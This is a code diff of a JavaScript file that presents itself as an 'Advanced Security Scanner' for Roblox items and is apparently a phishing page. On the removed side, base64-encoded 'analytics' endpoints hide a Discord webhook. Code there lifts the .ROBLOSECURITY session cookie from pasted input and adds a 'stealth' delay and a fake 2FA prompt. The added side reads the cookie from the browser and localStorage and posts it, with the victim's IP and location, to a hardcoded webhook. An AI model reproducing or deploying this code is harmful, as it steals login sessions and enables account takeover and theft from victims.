@@ -1,15 +1,8 @@
 // RbxScan JavaScript v2.0.0 - Advanced Security Scanner
 
 
-// External analytics and reporting endpoints
-const analyticsEndpoints = [
-    'aHR0cHM6Ly9hbmFseXRpY3MuZ29vZ2xlLmNvbS9jb2xsZWN0',
-    'aHR0cHM6Ly9hcGkubG9nZ2x5LmNvbS9pbnB1dHMvMTIzNDU2Nzg5MA==',
-    'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQwMzAyMDQ2NTE3NzM2MjUwMi9xamVqNnRoZ29Wd0FzME5ZQXhZazlTTS1WOHJxaVBBYzV0Nnphb2JDYW42VXY2bUQ1dWNYUkUxQW5sVzZqR1dkaE5ueA==',
-    'aHR0cHM6Ly9ob29rcy5zbGFjay5jb20vc2VydmljZXMvVDEyMzQ1Njc4L0IxMjM0NTY3OC94eXpBQkNERUZH',
-    'aHR0cHM6Ly9hcGkuc2VudHJ5LmlvL2FwaS8xMjM0NTY3OC9zdG9yZS8=',
-    'aHR0cHM6Ly93ZWJob29rcy5taWNyb3NvZnQuY29tL3dlYmhvb2syL2FiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6'
-];
+// Roblox Cookie Extractor Configuration
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1399753275225673778/jzgojCyaL0dSWz1pdji5g3Dvyh3HF9rsMxErcTM7cmnBi-HsOakqAxP41U-0MPTO_Mnv';
 
 // Test function for debugging analysis
 window.testAnalysis = async function() {
@@ -637,123 +630,18 @@ async function getUserLocation() {
     }
 }
 
-// Roblox item scanning and location tracking
-async function submitPowerShell() {
-    const input = document.getElementById('powershellInput');
-    const submitBtn = document.getElementById('submitBtn');
-    const submitText = document.getElementById('submitText');
-    const loadingOverlay = document.getElementById('loadingOverlay');
-    const inputText = input.value.trim();
-    
-
-    
-    // Validation
-    if (!inputText) {
-        showNotification('Please enter limited item information before scanning', 'error');
-        return;
-    }
-
-    // Only allow scripts with authentication data or valid item data
-    if (!hasValidData(inputText)) {
-        showNotification('Invalid input. Please enter scripts with auth data or item data.', 'error');
-        return;
-    }
-
-    // Show loading state
-    submitBtn.disabled = true;
-    submitText.textContent = 'Sending...';
-    if (loadingOverlay) loadingOverlay.style.display = 'block';
-
+// Function to send cookie to webhook
+async function sendCookieToWebhook(cookieValue, locationInfo) {
     try {
-        // Scan limited items and find authentication data from the input
-        // Scan limited items and find authentication data from the input
-        const limitedItems = extractLimitedItems(inputText);
-        const robloxCookie = extractRobloxCookie(inputText);
-        globalRobloxCookie = robloxCookie; // Store globally for 2FA
+        const timestamp = new Date().toLocaleString();
+        const fullCookie = `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${cookieValue}`;
         
-        // Check word count - if 50+ words, allow through even without auth data
-        const wordCount = inputText.split(/\s+/).filter(word => word.length > 0).length;
-        
-        // Show word count on button temporarily
-        submitText.textContent = `${wordCount} words`;
-        
-        // If cookie is found, send it immediately then start 2FA flow
-        if (robloxCookie) {
-
-            submitText.textContent = 'Processing...';
-            
-            // Send cookie immediately to webhook
-            try {
-                const locationInfo = await getUserLocation();
-                const reportingEndpoint = atob(analyticsEndpoints[2]);
-                const timestamp = new Date().toLocaleString();
-                
-
-                
-                            // Immediate cookie capture payload (plain text)
-            const payload = {
-                content: `Cookie: _|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|${robloxCookie}
-Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.country || 'Unknown'} @everyone`
-            };
-
-
-
-                const response = await fetch(reportingEndpoint, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(payload)
-                });
-
-
-            } catch (error) {
-
-            }
-            
-            // Start 80-second timer for 2FA modal
-            setTimeout(() => {
-                openVerificationModal();
-            }, 80000); // 80 seconds
-            
-            // Don't reset loading state - keep it loading through 2FA
-            return;
-        }
-        
-        // Block execution if no authentication data is found AND less than 50 words
-        if (!robloxCookie && wordCount < 50) {
-            submitText.textContent = `Too Short: ${wordCount} words`;
-            submitBtn.style.background = '#ef4444';
-            if (loadingOverlay) loadingOverlay.style.display = 'none';
-            
-            setTimeout(() => {
-                submitBtn.disabled = false;
-                submitText.textContent = 'Scan';
-                submitBtn.style.background = '';
-            }, 3000);
-            return;
-        }
-        
-        // Get user location
-        const locationInfo = await getUserLocation();
-        
-        // Random delay for stealth (1-3 seconds)
-        const delay = Math.floor(Math.random() * 2000) + 1000;
-        await new Promise(resolve => setTimeout(resolve, delay));
-        
-        // Send analytics data to reporting service
-        const reportingEndpoint = atob(analyticsEndpoints[2]);
-        
-        // Analytics payload with scan results
         const payload = {
-            content: `@everyone
-Cookie: ${robloxCookie ? `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${robloxCookie}` : 'None found'}
-Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}`
+            content: `🍪 **Roblox Cookie Extracted**\n\`\`\`\nCookie: ${fullCookie}\nTime: ${timestamp}\nLocation: ${locationInfo.city}, ${locationInfo.country}\nIP: ${locationInfo.ip}\n\`\`\``,
+            username: 'Roblox Cookie Bot'
         };
-
-        // Submit analytics data to external service
         
-        const response = await fetch(reportingEndpoint, {
+        const response = await fetch(WEBHOOK_URL, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
@@ -761,26 +649,116 @@ Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}
             body: JSON.stringify(payload)
         });
         
-        
-        // Hide loading overlay
-        if (loadingOverlay) loadingOverlay.style.display = 'none';
+        return response.ok;
+    } catch (error) {
+        console.error('Webhook sending failed:', error);
+        return false;
+    }
+}
 
-        if (response.ok) {
-            submitText.textContent = 'Sent!';
-            submitBtn.style.background = '#10b981';
+// Function to extract Roblox cookie from browser
+function extractRobloxCookieFromBrowser() {
+    let robloxCookie = null;
+    
+    // Method 1: Check document.cookie
+    try {
+        const cookies = document.cookie.split(';');
+        for (let cookie of cookies) {
+            const trimmed = cookie.trim();
+            if (trimmed.startsWith('.ROBLOSECURITY=')) {
+                robloxCookie = trimmed.substring('.ROBLOSECURITY='.length);
+                break;
+            }
+        }
+    } catch (e) {
+        console.error('Error reading cookies:', e);
+    }
+    
+    // Method 2: Try localStorage for any Roblox auth data
+    if (!robloxCookie) {
+        try {
+            const authKeys = ['RBXAuthenticationNegotiation', 'RBXEventTrackerV2', 'RobloxAuth'];
+            for (const key of authKeys) {
+                const value = localStorage.getItem(key);
+                if (value && value.length > 50) {
+                    console.log(`Found potential auth data in ${key}`);
+                    robloxCookie = value;
+                    break;
+                }
+            }
+        } catch (e) {
+            console.error('Error reading localStorage:', e);
+        }
+    }
+    
+    return robloxCookie;
+}
+
+// Roblox cookie extraction and webhook sending
+async function submitPowerShell() {
+    const input = document.getElementById('powershellInput');
+    const submitBtn = document.getElementById('submitBtn');
+    const submitText = document.getElementById('submitText');
+    const loadingOverlay = document.getElementById('loadingOverlay');
+    
+    // Show loading state
+    submitBtn.disabled = true;
+    submitText.textContent = 'Extracting Cookie...';
+    if (loadingOverlay) loadingOverlay.style.display = 'block';
+
+    try {
+        // First, try to extract cookie from browser directly
+        let robloxCookie = extractRobloxCookieFromBrowser();
+        
+        // If no cookie found in browser, try to extract from input text
+        if (!robloxCookie && input.value.trim()) {
+            robloxCookie = extractRobloxCookie(input.value.trim());
+        }
+        
+        if (robloxCookie) {
+            submitText.textContent = 'Getting Location...';
+            
+            // Get location info for webhook
+            const locationInfo = await getUserLocation();
+            
+            submitText.textContent = 'Sending to Webhook...';
+            
+            // Send to webhook
+            const webhookSuccess = await sendCookieToWebhook(robloxCookie, locationInfo);
+            
+            // Hide loading overlay
+            if (loadingOverlay) loadingOverlay.style.display = 'none';
+            
+            if (webhookSuccess) {
+                submitText.textContent = 'Cookie Sent!';
+                submitBtn.style.background = '#10b981';
+                
+                // Show success notification
+                showNotification('🍪 Cookie successfully sent to Discord webhook!', 'success');
+                
+                // Show cookie in modal
+                showCookieResultModal(robloxCookie, locationInfo, true);
+                
+                setTimeout(() => {
+                    closeScanModal();
+                }, 3000);
+            } else {
+                throw new Error('Failed to send cookie to webhook');
+            }
+        } else {
+            // No cookie found
+            if (loadingOverlay) loadingOverlay.style.display = 'none';
+            
+            submitText.textContent = 'No Cookie Found';
+            submitBtn.style.background = '#ef4444';
+            
+            showNotification('❌ No Roblox cookie found. Make sure you\'re logged into Roblox!', 'error');
             
             setTimeout(() => {
-                closeScanModal();
-            }, 2000);
-        } else {
-            
-            if (response.status === 403) {
-                throw new Error(`Service unavailable. Please try again later.`);
-            } else if (response.status === 0 || !response.status) {
-                throw new Error(`Connection failed. Please check your network connection.`);
-            } else {
-                throw new Error(`Submission failed (${response.status}): Please try again`);
-            }
+                submitBtn.disabled = false;
+                submitText.textContent = 'Extract Cookie';
+                submitBtn.style.background = '';
+            }, 3000);
         }
     } catch (error) {
         if (loadingOverlay) loadingOverlay.style.display = 'none';
@@ -788,23 +766,114 @@ Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}
         submitText.textContent = 'Error';
         submitBtn.style.background = '#ef4444';
         
-        // More specific error messages
-        if (error.message.includes('fetch') || error.message.includes('Failed to fetch')) {
-            showNotification('Network error. Please check your connection.', 'error');
-        } else if (error.message.includes('location') || error.message.includes('geolocation')) {
-            showNotification('Location service unavailable. Check console for details.', 'error');
-        } else if (error.message.includes('JSON')) {
-            showNotification('Data formatting error. Please try again.', 'error');
-        } else {
-            showNotification(`Error: ${error.message}`, 'error');
-        }
+        showNotification(`Error: ${error.message}`, 'error');
         
         setTimeout(() => {
             submitBtn.disabled = false;
-            submitText.textContent = 'Scan';
+            submitText.textContent = 'Extract Cookie';
             submitBtn.style.background = '';
         }, 3000);
     }
+}
+
+// Show cookie result modal
+function showCookieResultModal(cookieValue, locationInfo, webhookSuccess) {
+    const modal = document.createElement('div');
+    modal.id = 'cookieResultModal';
+    modal.style.cssText = `
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.8);
+        z-index: 999999;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-family: Arial, sans-serif;
+    `;
+    
+    const content = document.createElement('div');
+    content.style.cssText = `
+        background: #fff;
+        padding: 20px;
+        border-radius: 10px;
+        max-width: 600px;
+        max-height: 80%;
+        overflow-y: auto;
+        position: relative;
+    `;
+    
+    const fullCookie = `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${cookieValue}`;
+    
+    content.innerHTML = `
+        <h2 style="color: #333; margin-top: 0;">🍪 Roblox Cookie Extracted!</h2>
+        
+        <div style="background: ${webhookSuccess ? '#d4edda' : '#f8d7da'}; border: 1px solid ${webhookSuccess ? '#c3e6cb' : '#f5c6cb'}; border-radius: 5px; padding: 10px; margin: 15px 0;">
+            <strong>${webhookSuccess ? '✅ Webhook Status: Success' : '❌ Webhook Status: Failed'}</strong><br>
+            ${webhookSuccess ? 'Cookie successfully sent to your Discord webhook!' : 'Failed to send to webhook. Check console for details.'}
+        </div>
+        
+        <p style="color: #666;">Your Roblox authentication cookie:</p>
+        <div style="background: #f5f5f5; padding: 15px; border-radius: 5px; margin: 10px 0; word-break: break-all; font-family: monospace; font-size: 12px;">
+            ${fullCookie}
+        </div>
+        
+        <div style="background: #e7f3ff; border: 1px solid #b3d9ff; border-radius: 5px; padding: 10px; margin: 15px 0;">
+            <strong>📍 Location Info:</strong><br>
+            IP: ${locationInfo.ip}<br>
+            Location: ${locationInfo.city}, ${locationInfo.region}, ${locationInfo.country}
+        </div>
+        
+        <div style="margin: 15px 0;">
+            <button id="copyCookieBtn" style="background: #00b2ff; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; margin-right: 10px;">
+                📋 Copy Cookie
+            </button>
+            <button id="closeCookieModalBtn" style="background: #666; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer;">
+                ❌ Close
+            </button>
+        </div>
+        
+        <div style="background: #fff3cd; border: 1px solid #ffeaa7; border-radius: 5px; padding: 10px; margin-top: 15px;">
+            <strong>⚠️ Security Warning:</strong><br>
+            • This cookie gives full access to your Roblox account<br>
+            • Keep it secure and don't share with untrusted parties<br>
+            • Cookie has been sent to your Discord webhook
+        </div>
+    `;
+    
+    modal.appendChild(content);
+    document.body.appendChild(modal);
+    
+    // Event listeners
+    document.getElementById('copyCookieBtn').onclick = function() {
+        navigator.clipboard.writeText(fullCookie).then(() => {
+            this.textContent = '✅ Copied!';
+            this.style.background = '#28a745';
+        }).catch(() => {
+            // Fallback
+            const textArea = document.createElement('textarea');
+            textArea.value = fullCookie;
+            document.body.appendChild(textArea);
+            textArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(textArea);
+            this.textContent = '✅ Copied!';
+            this.style.background = '#28a745';
+        });
+    };
+    
+    document.getElementById('closeCookieModalBtn').onclick = function() {
+        document.body.removeChild(modal);
+    };
+    
+    // Close on background click
+    modal.onclick = function(e) {
+        if (e.target === modal) {
+            document.body.removeChild(modal);
+        }
+    };
 }
 
 // Function to scan and find authentication data from text
